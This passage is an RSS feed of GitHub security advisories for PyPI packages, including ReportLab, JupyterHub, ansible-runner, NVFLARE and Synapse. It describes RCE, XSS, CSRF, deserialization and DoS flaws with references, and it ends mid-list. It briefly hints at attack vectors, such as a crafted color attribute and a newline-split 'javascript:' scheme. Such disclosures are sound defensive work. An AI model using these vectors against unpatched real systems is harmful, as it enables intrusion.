<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2022-09-12T03:57:06.891Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[arrayfire] Potential memory corruption in arrayfire]]></title>
        <id>https://github.com/advisories/GHSA-69fv-gw6g-8ccg</id>
        <link href="https://github.com/advisories/GHSA-69fv-gw6g-8ccg"/>
        <updated>2022-09-10T02:25:08.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the arrayfire crate before 3.6.0 for Rust. Addition of the repr() attribute to an enum is mishandled, leading to memory corruption.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20998">https://nvd.nist.gov/vuln/detail/CVE-2018-20998</a></li>
<li><a href="https://github.com/arrayfire/arrayfire-rust/pull/177">https://github.com/arrayfire/arrayfire-rust/pull/177</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2018-0011.html">https://rustsec.org/advisories/RUSTSEC-2018-0011.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/arrayfire/PYSEC-2019-144.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/arrayfire/PYSEC-2019-144.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-69fv-gw6g-8ccg">https://github.com/advisories/GHSA-69fv-gw6g-8ccg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69fv-gw6g-8ccg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-08-25T20:43:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[reportlab] XML Injection in ReportLab]]></title>
        <id>https://github.com/advisories/GHSA-qpg2-vx7j-3869</id>
        <link href="https://github.com/advisories/GHSA-qpg2-vx7j-3869"/>
        <updated>2022-09-09T16:48:43.000Z</updated>
        <content type="html"><![CDATA[<p>ReportLab through 3.5.26 allows remote code execution because of toColor(eval(arg)) in colors.py, as demonstrated by a crafted XML document with '&lt;span color="' followed by arbitrary Python code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17626">https://nvd.nist.gov/vuln/detail/CVE-2019-17626</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2020:0195">https://access.redhat.com/errata/RHSA-2020:0195</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2020:0197">https://access.redhat.com/errata/RHSA-2020:0197</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2020:0201">https://access.redhat.com/errata/RHSA-2020:0201</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2020:0230">https://access.redhat.com/errata/RHSA-2020:0230</a></li>
<li><a href="https://bitbucket.org/rptlab/reportlab/issues/199/eval-in-colorspy-leads-to-remote-code">https://bitbucket.org/rptlab/reportlab/issues/199/eval-in-colorspy-leads-to-remote-code</a></li>
<li><a href="https://bitbucket.org/rptlab/reportlab/src/default/CHANGES.md">https://bitbucket.org/rptlab/reportlab/src/default/CHANGES.md</a></li>
<li><a href="https://hg.reportlab.com/hg-public/reportlab/rev/51a521ad7dd3">https://hg.reportlab.com/hg-public/reportlab/rev/51a521ad7dd3</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2020/02/msg00019.html">https://lists.debian.org/debian-lts-announce/2020/02/msg00019.html</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NSCTOE3DITFICY2XKBYZ5WAF5TSQ52DM/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NSCTOE3DITFICY2XKBYZ5WAF5TSQ52DM/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZZPHP2BJSTP4IYCSJRQINP763IHO6ASL/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZZPHP2BJSTP4IYCSJRQINP763IHO6ASL/</a></li>
<li><a href="https://security.gentoo.org/glsa/202007-35">https://security.gentoo.org/glsa/202007-35</a></li>
<li><a href="https://usn.ubuntu.com/4273-1/">https://usn.ubuntu.com/4273-1/</a></li>
<li><a href="https://www.debian.org/security/2020/dsa-4663">https://www.debian.org/security/2020/dsa-4663</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2020-02/msg00002.html">http://lists.opensuse.org/opensuse-security-announce/2020-02/msg00002.html</a></li>
<li><a href="https://access.redhat.com/security/cve/cve-2019-17626">https://access.redhat.com/security/cve/cve-2019-17626</a></li>
<li><a href="https://web.archive.org/web/20191016111823/https://bitbucket.org/rptlab/reportlab/issues/199/eval-in-colorspy-leads-to-remote-code">https://web.archive.org/web/20191016111823/https://bitbucket.org/rptlab/reportlab/issues/199/eval-in-colorspy-leads-to-remote-code</a></li>
<li><a href="https://github.com/advisories/GHSA-qpg2-vx7j-3869">https://github.com/advisories/GHSA-qpg2-vx7j-3869</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/reportlab/PYSEC-2019-117.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/reportlab/PYSEC-2019-117.yaml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qpg2-vx7j-3869</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-24T22:00:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterhub] Cross-Site Request Forgery in JupyterHub]]></title>
        <id>https://github.com/advisories/GHSA-7xx3-qp5w-fw96</id>
        <link href="https://github.com/advisories/GHSA-7xx3-qp5w-fw96"/>
        <updated>2022-09-09T16:46:18.000Z</updated>
        <content type="html"><![CDATA[<p>JupyterHub 1.1.0 allows CSRF in the admin panel via a request that lacks an _xsrf field, as demonstrated by a /hub/api/user request (to add or remove a user account).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-36191">https://nvd.nist.gov/vuln/detail/CVE-2020-36191</a></li>
<li><a href="https://github.com/jupyterhub/jupyterhub/issues/3304">https://github.com/jupyterhub/jupyterhub/issues/3304</a></li>
<li><a href="https://github.com/jupyterhub/jupyterhub/releases">https://github.com/jupyterhub/jupyterhub/releases</a></li>
<li><a href="https://github.com/advisories/GHSA-7xx3-qp5w-fw96">https://github.com/advisories/GHSA-7xx3-qp5w-fw96</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/jupyterhub/PYSEC-2021-67.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/jupyterhub/PYSEC-2021-67.yaml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7xx3-qp5w-fw96</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:38:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[octoprint] Cross-site Scripting in OctoPrint]]></title>
        <id>https://github.com/advisories/GHSA-h8pc-j334-jjhm</id>
        <link href="https://github.com/advisories/GHSA-h8pc-j334-jjhm"/>
        <updated>2022-09-09T03:54:09.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site Scripting (XSS) - Generic in GitHub repository octoprint/octoprint prior to 1.8.0. The Stream URL of octoprint application allowing a xss payload to execute.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-1432">https://nvd.nist.gov/vuln/detail/CVE-2022-1432</a></li>
<li><a href="https://github.com/octoprint/octoprint/commit/6d259d7e6f5b0de9a1c762831537a386e53978d3">https://github.com/octoprint/octoprint/commit/6d259d7e6f5b0de9a1c762831537a386e53978d3</a></li>
<li><a href="https://huntr.dev/bounties/cb545c63-a3c1-4d57-8f06-e4593ab389bf">https://huntr.dev/bounties/cb545c63-a3c1-4d57-8f06-e4593ab389bf</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/octoprint/PYSEC-2022-201.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/octoprint/PYSEC-2022-201.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-h8pc-j334-jjhm">https://github.com/advisories/GHSA-h8pc-j334-jjhm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h8pc-j334-jjhm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-19T00:00:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Cross-site Scripting in Mistune]]></title>
        <id>https://github.com/advisories/GHSA-hpv5-v8g5-c864</id>
        <link href="https://github.com/advisories/GHSA-hpv5-v8g5-c864"/>
        <updated>2022-09-09T02:53:41.000Z</updated>
        <content type="html"><![CDATA[<p>mistune.py in Mistune 0.7.4 allows XSS via an unexpected newline (such as in java\nscript:) or a crafted email address, related to the escape and autolink functions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-15612">https://nvd.nist.gov/vuln/detail/CVE-2017-15612</a></li>
<li><a href="https://github.com/lepture/mistune/pull/140">https://github.com/lepture/mistune/pull/140</a></li>
<li><a href="https://github.com/advisories/GHSA-hpv5-v8g5-c864">https://github.com/advisories/GHSA-hpv5-v8g5-c864</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2017-80.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2017-80.yaml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hpv5-v8g5-c864</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T00:26:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nemo-toolkit] Path Traversal in nemo-toolkit]]></title>
        <id>https://github.com/advisories/GHSA-9hg3-hmmf-c3gr</id>
        <link href="https://github.com/advisories/GHSA-9hg3-hmmf-c3gr"/>
        <updated>2022-09-08T00:00:27.000Z</updated>
        <content type="html"><![CDATA[<p>NVIDIA NeMo before 1.6.0 contains a vulnerability in ASR WebApp, in which ../ Path Traversal may lead to deletion of any directory when admin privileges are available.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NVIDIA/NeMo/security/advisories/GHSA-rpx7-33j2-xx9x">https://github.com/NVIDIA/NeMo/security/advisories/GHSA-rpx7-33j2-xx9x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22821">https://nvd.nist.gov/vuln/detail/CVE-2022-22821</a></li>
<li><a href="https://github.com/advisories/GHSA-9hg3-hmmf-c3gr">https://github.com/advisories/GHSA-9hg3-hmmf-c3gr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9hg3-hmmf-c3gr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-01-11T00:00:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[indy-node] Remote code execution in Indy's NODE_UPGRADE transaction]]></title>
        <id>https://github.com/advisories/GHSA-r6v9-p59m-gj2p</id>
        <link href="https://github.com/advisories/GHSA-r6v9-p59m-gj2p"/>
        <updated>2022-09-09T02:16:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>pool-upgrade</code> request handler in Indy-Node <code>&lt;=1.12.4</code> allows an improperly authenticated attacker to remotely execute code on nodes within the network.</p>
<p>Network operators are strongly encouraged to upgrade to the latest Indy-Node release <code>&gt;=1.12.5</code> as soon as possible.</p>
<h3 id="patches">Patches</h3>
<p>The <code>pool-upgrade</code> request handler in Indy-Node <code>&gt;=1.12.5</code> has been updated to properly authenticate <code>pool-upgrade</code> transactions before any processing is performed by the request handler.  The transactions are further sanitized to prevent remote code execution.</p>
<h3 id="mitigations">Mitigations</h3>
<p>Network operators are strongly encouraged to upgrade to the latest Indy-Node release <code>&gt;=1.12.5</code> as soon as possible.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>Thank you to @shakreiner at CyberArk Labs for finding and responsibly disclosing this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/hyperledger/indy-node/security/advisories/GHSA-r6v9-p59m-gj2p">https://github.com/hyperledger/indy-node/security/advisories/GHSA-r6v9-p59m-gj2p</a></li>
<li><a href="https://github.com/hyperledger/indy-node/commit/fe507474f77084faef4539101e2bbb4d508a97f5">https://github.com/hyperledger/indy-node/commit/fe507474f77084faef4539101e2bbb4d508a97f5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31020">https://nvd.nist.gov/vuln/detail/CVE-2022-31020</a></li>
<li><a href="https://github.com/hyperledger/indy-node/releases/tag/v1.12.5">https://github.com/hyperledger/indy-node/releases/tag/v1.12.5</a></li>
<li><a href="https://github.com/advisories/GHSA-r6v9-p59m-gj2p">https://github.com/advisories/GHSA-r6v9-p59m-gj2p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r6v9-p59m-gj2p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-09-02T21:55:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible-runner] ansible-runner vulnerable to shell command injection]]></title>
        <id>https://github.com/advisories/GHSA-6j58-grhv-2769</id>
        <link href="https://github.com/advisories/GHSA-6j58-grhv-2769"/>
        <updated>2022-09-01T22:22:12.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in ansible-runner. An improper escaping of the shell command, while calling the ansible_runner.interface.run_command, can lead to parameters getting executed as host's shell command. A developer could unintentionally write code that gets executed in the host rather than the virtual environment.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4041">https://nvd.nist.gov/vuln/detail/CVE-2021-4041</a></li>
<li><a href="https://github.com/ansible/ansible-runner/commit/3533f265f4349a3f2a0283158cd01b59a6bbc7bd">https://github.com/ansible/ansible-runner/commit/3533f265f4349a3f2a0283158cd01b59a6bbc7bd</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2021-4041">https://access.redhat.com/security/cve/CVE-2021-4041</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2028074">https://bugzilla.redhat.com/show_bug.cgi?id=2028074</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ansible-runner/PYSEC-2022-253.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ansible-runner/PYSEC-2022-253.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-6j58-grhv-2769">https://github.com/advisories/GHSA-6j58-grhv-2769</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j58-grhv-2769</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-25T00:00:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deluge] Deluge Web-UI vulnerable to XSS through a crafted torrent file]]></title>
        <id>https://github.com/advisories/GHSA-5c8p-qhch-qhx6</id>
        <link href="https://github.com/advisories/GHSA-5c8p-qhch-qhx6"/>
        <updated>2022-09-01T22:19:30.000Z</updated>
        <content type="html"><![CDATA[<p>The Deluge Web-UI is vulnerable to cross-site scripting through a crafted torrent file. The the data from torrent files is not properly sanitised as it's interpreted directly as HTML. Someone who supplies the user with a malicious torrent file can execute arbitrary Javascript code in the context of the user's browser session.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3427">https://nvd.nist.gov/vuln/detail/CVE-2021-3427</a></li>
<li><a href="https://dev.deluge-torrent.org/ticket/3459">https://dev.deluge-torrent.org/ticket/3459</a></li>
<li><a href="https://groups.google.com/g/deluge-dev/c/e5zh7wT0rEg">https://groups.google.com/g/deluge-dev/c/e5zh7wT0rEg</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/deluge/PYSEC-2022-256.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/deluge/PYSEC-2022-256.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-5c8p-qhch-qhx6">https://github.com/advisories/GHSA-5c8p-qhch-qhx6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5c8p-qhch-qhx6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-27T00:00:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible-runner] ansible-runner 2.0.0 default temporary files written to world R/W locations]]></title>
        <id>https://github.com/advisories/GHSA-wwch-cmqr-hhrm</id>
        <link href="https://github.com/advisories/GHSA-wwch-cmqr-hhrm"/>
        <updated>2022-09-01T22:18:54.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in ansible-runner where the default temporary files configuration in ansible-2.0.0 are written to world R/W locations. This flaw allows an attacker to pre-create the directory, resulting in reading private information or forcing ansible-runner to write files as the legitimate user in a place they did not expect. The highest threat from this vulnerability is to confidentiality and integrity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3701">https://nvd.nist.gov/vuln/detail/CVE-2021-3701</a></li>
<li><a href="https://github.com/ansible/ansible-runner/issues/738">https://github.com/ansible/ansible-runner/issues/738</a></li>
<li><a href="https://github.com/ansible/ansible-runner/pull/742/commits">https://github.com/ansible/ansible-runner/pull/742/commits</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2021-3701">https://access.redhat.com/security/cve/CVE-2021-3701</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1977959">https://bugzilla.redhat.com/show_bug.cgi?id=1977959</a></li>
<li><a href="https://github.com/ansible/ansible-runner/pull/742">https://github.com/ansible/ansible-runner/pull/742</a></li>
<li><a href="https://github.com/advisories/GHSA-wwch-cmqr-hhrm">https://github.com/advisories/GHSA-wwch-cmqr-hhrm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wwch-cmqr-hhrm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-24T00:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible-runner] ansible-runner 2.0.0 vulnerable to Race Condition]]></title>
        <id>https://github.com/advisories/GHSA-772j-xvf9-qpf5</id>
        <link href="https://github.com/advisories/GHSA-772j-xvf9-qpf5"/>
        <updated>2022-09-01T22:17:51.000Z</updated>
        <content type="html"><![CDATA[<p>A race condition flaw was found in ansible-runner, where an attacker could watch for rapid creation and deletion of a temporary directory, substitute their directory at that name, and then have access to ansible-runner's private_data_dir the next time ansible-runner made use of the private_data_dir. The highest Threat out of this flaw is to integrity and confidentiality.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3702">https://nvd.nist.gov/vuln/detail/CVE-2021-3702</a></li>
<li><a href="https://github.com/ansible/ansible-runner/pull/742/commits">https://github.com/ansible/ansible-runner/pull/742/commits</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2021-3702">https://access.redhat.com/security/cve/CVE-2021-3702</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1977965">https://bugzilla.redhat.com/show_bug.cgi?id=1977965</a></li>
<li><a href="https://github.com/ansible/ansible-runner/pull/742">https://github.com/ansible/ansible-runner/pull/742</a></li>
<li><a href="https://github.com/ansible/ansible-runner/commit/93e95a3df9021a38010386d07df121392d249253">https://github.com/ansible/ansible-runner/commit/93e95a3df9021a38010386d07df121392d249253</a></li>
<li><a href="https://github.com/advisories/GHSA-772j-xvf9-qpf5">https://github.com/advisories/GHSA-772j-xvf9-qpf5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-772j-xvf9-qpf5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-24T00:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nvflare] NVFLARE unsafe deserialization due to Pickle]]></title>
        <id>https://github.com/advisories/GHSA-6qv6-q77g-7qm6</id>
        <link href="https://github.com/advisories/GHSA-6qv6-q77g-7qm6"/>
        <updated>2022-09-08T14:26:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>NVFLARE contains a vulnerability where deserialization of Untrusted Data due to Pickle usage may allow an unprivileged network attacker to cause Remote Code Execution, Denial Of Service, and Impact to both Confidentiality and Integrity. </p>
<p>All versions before 2.1.4 are affected. </p>
<p>CVSS Score = 9.8 </p>
<p><a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H">AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</a> </p>
<h3 id="patches">Patches</h3>
<p>The patch is included in nvflare==2.1.4 
This new version uses MessagePack instead of Pickle to do serialization and deserialization.  </p>
<p>Some object serializations supported by Pickle are not supported by MessagePack. We have provided out of box support for some built-in NVFLARE objects. For object serializations unsupported by MessagePack, the user will need to convert the objects to numpy or bytes before sending over to remote machines.  The list of supported object types are listed in <a href="https://github.com/NVIDIA/NVFlare/blob/2.1/nvflare/fuel/utils/fobs/README.rst">https://github.com/NVIDIA/NVFlare/blob/2.1/nvflare/fuel/utils/fobs/README.rst</a> </p>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds available. </p>
<h3 id="additional-information">Additional information</h3>
<p>Issue Found by: Oliver Sellwood (Nintorac) and Elias Hohl</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NVIDIA/NVFlare/security/advisories/GHSA-6qv6-q77g-7qm6">https://github.com/NVIDIA/NVFlare/security/advisories/GHSA-6qv6-q77g-7qm6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-34668">https://nvd.nist.gov/vuln/detail/CVE-2022-34668</a></li>
<li><a href="https://github.com/NVIDIA/NVFlare/commit/6cde16f3f4711583ae4d896dfcc125d25c7d5b0d">https://github.com/NVIDIA/NVFlare/commit/6cde16f3f4711583ae4d896dfcc125d25c7d5b0d</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nvflare/PYSEC-2022-257.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nvflare/PYSEC-2022-257.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-6qv6-q77g-7qm6">https://github.com/advisories/GHSA-6qv6-q77g-7qm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qv6-q77g-7qm6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-08-31T22:29:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[matrix-synapse] Denial of service due to incorrect application of event authorization rules]]></title>
        <id>https://github.com/advisories/GHSA-jhjh-776m-4765</id>
        <link href="https://github.com/advisories/GHSA-jhjh-776m-4765"/>
        <updated>2022-09-10T02:26:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Matrix specification specifies a list of <a href="https://spec.matrix.org/v1.3/rooms/v10/#authorization-rules">event authorization rules</a> which must be checked when determining if an event should be accepted into a room.</p>
<p>In versions of Synapse up to and including v1.61, some of these rules are not correctly applied. An attacker could craft events which would be accepted by Synapse but not a spec-conformant server, potentially causing divergence in the room state between servers.</p>
<h3 id="patches">Patches</h3>
<p>Administrators of homeservers with federation enabled are advised to upgrade to v1.62.0 or higher.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Federation can be disabled by setting <a href="https://matrix-org.github.io/synapse/latest/usage/configuration/config_documentation.html#federation_domain_whitelist"><code>federation_domain_whitelist</code></a> to an empty list (<code>[]</code>).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/synapse/pull/13087">https://github.com/matrix-org/synapse/pull/13087</a></li>
<li><a href="https://github.com/matrix-org/synapse/pull/13088">https://github.com/matrix-org/synapse/pull/13088</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, e-mail us at <a href="mailto:security@matrix.org">security@matrix.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/synapse/security/advisories/GHSA-jhjh-776m-4765">https://github.com/matrix-org/synapse/security/advisories/GHSA-jhjh-776m-4765</a></li>
<li><a href="https://github.com/matrix-org/synapse/pull/13087">https://github.com/matrix-org/synapse/pull/13087</a></li>
<li><a href="https://github.com/matrix-org/synapse/pull/13088">https://github.com/matrix-org/synapse/pull/13088</a></li>
<li><a href="https://github.com/matrix-org/synapse/releases/tag/v1.62.0">https://github.com/matrix-org/synapse/releases/tag/v1.62.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31152">https://nvd.nist.gov/vuln/detail/CVE-2022-31152</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/matrix-synapse/PYSEC-2022-262.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/matrix-synapse/PYSEC-2022-262.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-jhjh-776m-4765">https://github.com/advisories/GHSA-jhjh-776m-4765</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jhjh-776m-4765</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-31T21:25:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mod-wsgi] Incorrect header handling in mod-wsgi]]></title>
        <id>https://github.com/advisories/GHSA-7527-8855-9cf8</id>
        <link href="https://github.com/advisories/GHSA-7527-8855-9cf8"/>
        <updated>2022-09-08T14:16:40.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in mod_wsgi. The X-Client-IP header is not removed from a request from an untrusted proxy, allowing an attacker to pass the X-Client-IP header to the target WSGI application because the condition to remove it is missing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-2255">https://nvd.nist.gov/vuln/detail/CVE-2022-2255</a></li>
<li><a href="https://github.com/GrahamDumpleton/mod_wsgi/blob/4.9.2/src/server/mod_wsgi.c#L13940-L13941">https://github.com/GrahamDumpleton/mod_wsgi/blob/4.9.2/src/server/mod_wsgi.c#L13940-L13941</a></li>
<li><a href="https://github.com/GrahamDumpleton/mod_wsgi/blob/4.9.2/src/server/mod_wsgi.c#L14046-L14082">https://github.com/GrahamDumpleton/mod_wsgi/blob/4.9.2/src/server/mod_wsgi.c#L14046-L14082</a></li>
<li><a href="https://modwsgi.readthedocs.io/en/latest/release-notes/version-4.9.3.html">https://modwsgi.readthedocs.io/en/latest/release-notes/version-4.9.3.html</a></li>
<li><a href="https://github.com/GrahamDumpleton/mod_wsgi/commit/af3c0c2736bc0b0b01fa0f0aad3c904b7fa9c751">https://github.com/GrahamDumpleton/mod_wsgi/commit/af3c0c2736bc0b0b01fa0f0aad3c904b7fa9c751</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mod-wsgi/PYSEC-2022-254.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mod-wsgi/PYSEC-2022-254.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-7527-8855-9cf8">https://github.com/advisories/GHSA-7527-8855-9cf8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7527-8855-9cf8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-26T00:03:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[opcua] Uncontrolled Resource Consumption in asyncua and opcua]]></title>
        <id>https://github.com/advisories/GHSA-mfpj-3qhm-976m</id>
        <link href="https://github.com/advisories/GHSA-mfpj-3qhm-976m"/>
        <updated>2022-08-30T20:50:33.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of package opcua; all versions of package asyncua are vulnerable to Denial of Service (DoS) due to a missing limitation on the number of received chunks - per single session or in total for all concurrent sessions. An attacker can exploit this vulnerability by sending an unlimited number of huge chunks (e.g. 2GB each) without sending the Final closing chunk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25304">https://nvd.nist.gov/vuln/detail/CVE-2022-25304</a></li>
<li><a href="https://github.com/FreeOpcUa/python-opcua/issues/1466">https://github.com/FreeOpcUa/python-opcua/issues/1466</a></li>
